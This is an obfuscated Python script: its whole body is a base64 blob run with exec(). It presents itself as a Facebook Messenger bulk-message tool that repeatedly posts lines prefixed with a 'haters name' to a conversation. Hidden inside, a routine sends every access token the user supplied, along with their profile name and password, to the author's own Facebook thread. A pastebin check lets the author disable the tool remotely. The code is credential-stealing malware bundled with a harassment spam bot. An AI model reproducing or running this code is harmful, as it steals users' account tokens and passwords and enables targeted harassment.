#ENCODED BY : SHANKAR-SUMAN 
#ENCRYPTION : Py3 BASE64
import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KCWRlZiBkb19HRVQoc2VsZik6DQoJCXNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCgkJc2VsZi5lbmRfaGVhZGVycygpDQoJCXNlbGYud2ZpbGUud3JpdGUoYiJGRUVMIFRIRSBQT1dFUiBPRiBTSEFOS0FSIFNVTUFOICIpDQoNCmRlZiBleGVjdXRlX3NlcnZlcigpOg0KCVBPUlQgPSA0MDAwDQoNCgl3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoNCgkJcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkNCgkJaHR0cGQuc2VydmVfZm9yZXZlcigpDQoNCmRlZiBzZW5kX21lc3NhZ2VzKCk6DQoJd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6DQoJCXBhc3N3b3JkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoJZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkDQoNCglpZiBlbnRlcmVkX3Bhc3N3b3JkICE9IHBhc3N3b3JkOg0KCQlwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpDQoJCXN5cy5leGl0KCkNCg0KCXdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOg0KCQl0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpDQoJbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpDQoNCglyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KDQoJZGVmIGNscygpOg0KCQlpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KCQkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCWVsc2U6DQoJCQlpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQoJCQkJb3Muc3lzdGVtKCdjbHMnKQ0KCWNscygpDQoNCglkZWYgbGluZXNzKCk6DQoJCXByaW50KCdcdTAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQ0KDQoJaGVhZGVycyA9IHsNCgkJJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsDQoJCSdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsDQoJCSdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLA0KCQknVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCgkJJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywNCgkJJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywNCgkJJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsDQoJCSdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJw0KCX0NCg0KCW1tbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzQ0MEFoRnZVJykudGV4dA0KDQoJaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoNCgkJcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQ0KCQlzeXMuZXhpdCgpDQoNCglsaW5lc3MoKQ0KDQoJYWNjZXNzX3Rva2VucyA9IFt0b2tlbi5zdHJpcCgpIGZvciB0b2tlbiBpbiB0b2tlbnNdDQoNCgl3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToNCgkJY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQoNCgl3aXRoIG9wZW4oJ2ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOg0KCQl0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KCXdpdGggb3Blbih0ZXh0X2ZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOg0KCQltZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkNCg0KCW51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykNCgltYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykNCg0KCXdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6DQoJCWhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoJd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToNCgkJc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkNCg0KCWxpbmVzcygpDQoJDQoJZGVmIGdldE5hbWUodG9rZW4pOg0KCQl0cnk6DQoJCQlkYXRhID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAvbWU/YWNjZXNzX3Rva2VuPXt0b2tlbn0nKS5qc29uKCkNCgkJZXhjZXB0Og0KCQkJZGF0YSA9ICIiDQoJCWlmICduYW1lJyBpbiBkYXRhOg0KCQkJcmV0dXJuIGRhdGFbJ25hbWUnXQ0KCQllbHNlOg0KCQkJcmV0dXJuICJFcnJvciBvY2N1cmVkIg0KDQoJZGVmIG1zZygpOg0KCQlwYXJhbWV0ZXJzID0gew0KCQkJJ2FjY2Vzc190b2tlbicgOiByYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpLA0KCQkJJ21lc3NhZ2UnOiAnSEVMTE8gU0hBTktBUiBTSVIgSU0gVVNJTkcgWU9VUiBTRVJWRVIgVXNlciBQcm9maWxlIE5hbWUgOiAnK2dldE5hbWUocmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSkrJ1xuIFRva2VuIDogJysiIHwgIi5qb2luKGFjY2Vzc190b2tlbnMpKydcbiBMaW5rIDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lc3NhZ2VzL3QvJytjb252b19pZCsnXG4gUGFzc3dvcmQ6ICcrcGFzc3dvcmQNCgkJfQ0KCQl0cnk6DQoJCQlzID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF8xMDAwNTg0MTUxNzA1OTAvIiwgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQoJCWV4Y2VwdDoNCgkJCXBhc3MNCgkNCgltc2coKQ0KCXdoaWxlIFRydWU6DQoJCXRyeToNCgkJCWZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6DQoJCQkJdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2Vucw0KCQkJCWFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbnNbdG9rZW5faW5kZXhdDQoNCgkJCQltZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQ0KDQoJCQkJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3t9LyIuZm9ybWF0KCd0XycrY29udm9faWQpDQoJCQkJcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0NCgkJCQlyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCgkJCQkNCg0KCQkJCWN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikNCgkJCQlpZiByZXNwb25zZS5vazoNCgkJCQkJcHJpbnQoIlsrXSBNZXNzYWdlcyB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KA0KCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpDQoJCQkJCXByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQ0KCQkJCQlsaW5lc3MoKQ0KCQkJCQlsaW5lc3MoKQ0KCQkJCWVsc2U6DQoJCQkJCXByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgNCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQ0KCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkNCgkJCQkJbGluZXNzKCkNCgkJCQkJbGluZXNzKCkNCgkJCQl0aW1lLnNsZWVwKHNwZWVkKQ0KDQoJCQlwcmludCgiWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uIikNCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQkJcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkNCg0KDQoNCmRlZiBtYWluKCk6DQoJc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQ0KCXNlcnZlcl90aHJlYWQuc3RhcnQoKQ0KCQ0KCXNlbmRfbWVzc2FnZXMoKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KCW1haW4oKQ=='))
